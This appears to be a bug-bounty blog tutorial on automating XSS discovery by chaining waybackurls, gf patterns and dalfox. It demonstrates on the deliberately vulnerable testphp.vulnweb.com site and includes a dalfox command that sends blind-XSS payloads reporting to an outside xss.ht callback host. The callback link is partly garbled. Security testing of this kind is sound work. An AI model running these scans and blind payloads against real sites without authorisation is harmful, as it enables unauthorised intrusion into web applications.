# :globe_with_meridians: Automating XSS using Dalfox, GF and Waybackurls

---

# Automating XSS using Dalfox, GF and Waybackurls

Hello Everyone! 😄

Hope you all are good.

Automating Stuff is always fun so Why not XSS. All you need is “GO Lang” installed on your machine and you are ready to go.

## Get Keshav Malik’s stories in your inbox

Join Medium for free to get updates from this writer.

Remember me for faster sign in

*Checkout Official Updated Guide on *[BugBlogs](https://www.bugblogs.tech/post/automating-xss-using-dalfox-gf-and-waybackurls)

## Pre-Requisites :

## Workflow

- After Installation of all above mentioned tools, Choose your Target. Let’s use “[http://testphp.vulnweb.com/](http://testphp.vulnweb.com/)” for demonstration purposes.

- Use Waybackurls to fetch URL’s for the chosen target and save the Output in a text file.

```
echo “testphp.vulnweb.com” | waybackurls | tee testphp.txt
```

- Use GF Patterns to find URLs that give you XSS and Use `sed` command to get our URLs ready for the Dalfox

```
cat test.txt | gf xss | sed ‘s/=.*/=/’ | sed ‘s/URL: //’ | tee testxss.txt
```

- Time to fire Dalfox and start finding XSS.

```
dalfox file testxss.txt -b [tigv2.xss.h](https://tigv2.xss.ht)t pipe
```

- Make sure you replace my Blind XSS Hunter Payload with that of yours.

## Automating Workflow using bash

Check out the Bash Script to automate the workflow.

---
